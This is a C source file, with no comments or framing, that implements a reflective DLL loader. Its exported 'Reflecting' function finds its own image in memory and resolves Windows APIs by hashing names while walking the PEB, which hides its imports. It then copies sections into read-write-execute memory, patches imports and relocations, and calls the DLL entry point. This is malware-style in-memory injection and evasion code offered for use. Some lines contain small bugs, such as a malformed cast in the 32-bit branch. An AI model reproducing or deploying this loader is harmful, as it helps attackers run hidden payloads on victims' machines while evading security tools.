#include "help.h"
#pragma intrinsic( _ReturnAddress )
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)_ReturnAddress(); }


__declspec(dllexport) void Reflecting();



HMODULE WINAPI hpGetModuleHandle(int id){

#ifdef _WIN64
MY_PEB * pPeb = (MY_PEB *) __readgsqword(0x60);
#else
(MY_PEB *) pPeb = (MY_PEB *) __readfsdword(0x30);
#endif

    PEB_LDR_DATA *pLdr = (PEB_LDR_DATA *) pPeb->Ldr;
    LIST_ENTRY * List = (LIST_ENTRY *) &pLdr->InMemoryOrderModuleList;
    LIST_ENTRY * pFirst = (LIST_ENTRY *) List->Flink;

    for (LIST_ENTRY * iterator = pFirst; iterator != List;iterator = iterator->Flink){
        MY_LDR_DATA_TABLE_ENTRY * pEntry = (MY_LDR_DATA_TABLE_ENTRY *) ((BYTE *)iterator - sizeof(LIST_ENTRY));


        char * ModuleName = (char *)pEntry->BaseDllName.Buffer;
        int mLength  = pEntry->BaseDllName.Length;
        DWORD HashedModule = 0;

         for(int i = 0; i < mLength; i++ ){
			HashedModule = ror( HashedModule );

			if( ModuleName[i] >= 'a' )
				HashedModule += ModuleName[i] - 0x20;
			else
				HashedModule += ModuleName[i];
		};
        
        if( id == 1 && HashedModule == KERNEL32DLL_HASH )
		{  return (HMODULE) pEntry->DllBase; }
        if(id == 0 && HashedModule == NTDLLDLL_HASH)
        {return (HMODULE) pEntry->DllBase;}
        
        


    }
    return NULL;

}


        
int WINAPI hpGetProcAddress(HMODULE hModule){
    char * pBaseAddress = (char *) hModule;

    IMAGE_DOS_HEADER * pDosHeader = (IMAGE_DOS_HEADER *) pBaseAddress;

    if(pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return -1;

    IMAGE_NT_HEADERS * pNTHeaders = (IMAGE_NT_HEADERS *) (pBaseAddress + pDosHeader->e_lfanew);
    if(pNTHeaders->Signature != IMAGE_NT_SIGNATURE) return -1;

    IMAGE_OPTIONAL_HEADER * pOptional = (IMAGE_OPTIONAL_HEADER * ) &pNTHeaders->OptionalHeader;

    IMAGE_DATA_DIRECTORY * pData = (IMAGE_DATA_DIRECTORY *) &pOptional->DataDirectory[0];
    IMAGE_EXPORT_DIRECTORY * pExport = (IMAGE_EXPORT_DIRECTORY *) (pBaseAddress + pData->VirtualAddress);

    void * pProcAddress;


    DWORD * pFunctions = (DWORD *) (pBaseAddress + pExport->AddressOfFunctions);
    DWORD * pName =(DWORD *) (pBaseAddress + pExport->AddressOfNames);
    WORD *  pOrdinals = (WORD *) (pBaseAddress + pExport->AddressOfNameOrdinals);

    for(int i = 0; i < pExport->NumberOfNames; i++){
        DWORD dwHashValue = hash((char *) (pBaseAddress + pName[i])); 
        if(dwHashValue== LOADLIBRARYA_HASH || dwHashValue== VIRTUALALLOC_HASH || dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH || dwHashValue == CREATETHREAD_HASH || dwHashValue == RTLMOVEMEMORY_HASH || dwHashValue == GETPROCADDRESS_HASH){
            if(dwHashValue == VIRTUALALLOC_HASH){
              pVirtualAlloc =(LPVOID (WINAPI *)(LPVOID,SIZE_T,DWORD,DWORD))(pBaseAddress + pFunctions[pOrdinals[i]]);
              
            }
           if(dwHashValue == CREATETHREAD_HASH){
                pCreateThread = (HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES, SIZE_T ,LPTHREAD_START_ROUTINE ,LPVOID ,DWORD ,LPDWORD ))(pBaseAddress + pFunctions[pOrdinals[i]]);
            }
           if(dwHashValue == RTLMOVEMEMORY_HASH){
                pRtlMoveMemory = (VOID (WINAPI * )(VOID  *,const VOID *, SIZE_T ))(pBaseAddress + pFunctions[pOrdinals[i]]);
            }
            if(dwHashValue == LOADLIBRARYA_HASH){
            pLoadLibraryA = (HMODULE (WINAPI *)(LPCSTR))(pBaseAddress + pFunctions[pOrdinals[i]]);
                
            }
            if(dwHashValue == GETPROCADDRESS_HASH){
                pGetProcAddress = (FARPROC (WINAPI *)(HMODULE,LPCSTR))(pBaseAddress + pFunctions[pOrdinals[i]]);

            }
            if(dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH){
                pNtFlushInstructionCache = ( NTSTATUS (NTAPI * )(HANDLE ,PVOID ,ULONG ))(pBaseAddress + pFunctions[pOrdinals[i]]);
}
            
        }


    }
    
return 0;
}




void Reflecting()
{  
    ULONG_PTR pLibraryAddress = caller();
    ULONG_PTR Verify;

    while(TRUE){

        if(((IMAGE_DOS_HEADER *)pLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE){
                Verify = (ULONG_PTR)((IMAGE_DOS_HEADER *)pLibraryAddress)->e_lfanew;
                
                if(Verify >= sizeof(IMAGE_DOS_HEADER) && Verify < 1024){
                Verify += pLibraryAddress;
                if(((IMAGE_NT_HEADERS *)Verify)->Signature == IMAGE_NT_SIGNATURE){
                    break;
                }
                }
            
        }
        pLibraryAddress--;
    }
     
    hpGetProcAddress(hpGetModuleHandle(1));
    

    char * BaseAddress = (char *)pLibraryAddress;


    IMAGE_DOS_HEADER * pDosHeader= (IMAGE_DOS_HEADER *)BaseAddress;
    IMAGE_NT_HEADERS * pNtHeaders = (IMAGE_NT_HEADERS *)((BYTE *)pDosHeader + pDosHeader->e_lfanew);
    IMAGE_FILE_HEADER * pFileHeader = (IMAGE_FILE_HEADER *)&pNtHeaders->FileHeader;
    IMAGE_OPTIONAL_HEADER * pOptionalHeader = (IMAGE_OPTIONAL_HEADER *)&pNtHeaders->OptionalHeader;
    IMAGE_SECTION_HEADER * pSection = (IMAGE_SECTION_HEADER *)((BYTE *)pOptionalHeader + pFileHeader->SizeOfOptionalHeader);
    IMAGE_DATA_DIRECTORY * pDataDirectory = (IMAGE_DATA_DIRECTORY *)&pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    
    LPVOID pNewAddress = pVirtualAlloc(NULL,pOptionalHeader->SizeOfImage,MEM_RESERVE | MEM_COMMIT,PAGE_EXECUTE_READWRITE);
    for(int i = 0; i < pOptionalHeader->SizeOfHeaders;i++){
        ((BYTE *)pNewAddress)[i] = ((BYTE *)BaseAddress)[i];
    }
    pDosHeader = (IMAGE_DOS_HEADER *)pNewAddress;
    
    pNtHeaders = (IMAGE_NT_HEADERS *)((BYTE *)pNewAddress + pDosHeader->e_lfanew);
   
    pOptionalHeader =(IMAGE_OPTIONAL_HEADER *)&pNtHeaders->OptionalHeader;
    pSection = (IMAGE_SECTION_HEADER *)((BYTE *)&pNtHeaders->OptionalHeader + pNtHeaders->FileHeader.SizeOfOptionalHeader);
    
    for(int i = 0; i < pFileHeader->NumberOfSections;i++){

        BYTE * pSections = (BYTE *)pNewAddress + pSection[i].VirtualAddress;
        BYTE * pDta = (BYTE *)BaseAddress + pSection[i].PointerToRawData;
        for(int n = 0; n < pSection[i].SizeOfRawData;n++){
            pSections[n] = pDta[n];
    }
    }
    pDataDirectory = (IMAGE_DATA_DIRECTORY *)&pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    IMAGE_IMPORT_DESCRIPTOR * pImportDirectory = (IMAGE_IMPORT_DESCRIPTOR *)((BYTE *)pNewAddress + pDataDirectory->VirtualAddress);
  
    for(int i = 0; pImportDirectory[i].Name != 0;i++){  
    char * sTemp = (char *)((char *)pNewAddress + pImportDirectory[i].Name);
    HMODULE Library;
    Library = pLoadLibraryA(sTemp);
    IMAGE_THUNK_DATA * pINT =(IMAGE_THUNK_DATA *) ((BYTE *)pNewAddress + pImportDirectory[i].OriginalFirstThunk);
    IMAGE_THUNK_DATA * pIAT =(IMAGE_THUNK_DATA *) ((BYTE *)pNewAddress + pImportDirectory[i].FirstThunk);

    
    for(int n = 0;pINT[n].u1.AddressOfData != 0;n++){
    IMAGE_IMPORT_BY_NAME * pName = (IMAGE_IMPORT_BY_NAME *) ((BYTE *)pNewAddress + pINT[n].u1.AddressOfData);
    
    pIAT[n].u1.Function = (ULONGLONG)pGetProcAddress(Library,pName->Name);

    }
    }

    BaseAddress =(char *) ((BYTE *)pNewAddress - pOptionalHeader->ImageBase);
    
    pDataDirectory = (IMAGE_DATA_DIRECTORY *)&pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    if(pDataDirectory->Size){
       
        IMAGE_BASE_RELOCATION * pBaseReloc = (IMAGE_BASE_RELOCATION *) ((BYTE * )pNewAddress + pDataDirectory->VirtualAddress);

    while(pBaseReloc->SizeOfBlock){
            size_t Count = (pBaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            BYTE * pReloc = (BYTE *)((BYTE *)pNewAddress + pBaseReloc->VirtualAddress);
            IMAGE_RELOC* Entry = (IMAGE_RELOC *)(pBaseReloc + 1);
            
            for(int e =0; Entry[e].offset != 0;e++){
                if(Entry[e].type == IMAGE_REL_BASED_DIR64 )*(ULONG_PTR *)(pReloc + Entry[e].offset) += (ULONG_PTR)BaseAddress;
                if(Entry[e].type == IMAGE_REL_BASED_HIGHLOW) *(DWORD *)(pReloc + Entry[e].offset) += (DWORD)BaseAddress;
                if(Entry[e].type == IMAGE_REL_BASED_HIGH ) *(WORD *)(pReloc + Entry[e].offset) += HIWORD(BaseAddress);
			    if(Entry[e].type == IMAGE_REL_BASED_LOW ) *(WORD *)(pReloc + Entry[e].offset) += LOWORD(BaseAddress); 
           }
           
             
      pBaseReloc = (IMAGE_BASE_RELOCATION *)((BYTE *)pBaseReloc + pBaseReloc->SizeOfBlock);
    }

}


BaseAddress = (char *)((BYTE *)pNewAddress + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
hpGetProcAddress(hpGetModuleHandle(0));
pNtFlushInstructionCache( (HANDLE)-1, NULL, 0 );
DLLMAIN EntryPoint = (DLLMAIN)((BYTE *)pNewAddress + pOptionalHeader->AddressOfEntryPoint);
EntryPoint((HINSTANCE)pNewAddress, DLL_PROCESS_ATTACH, NULL);


}
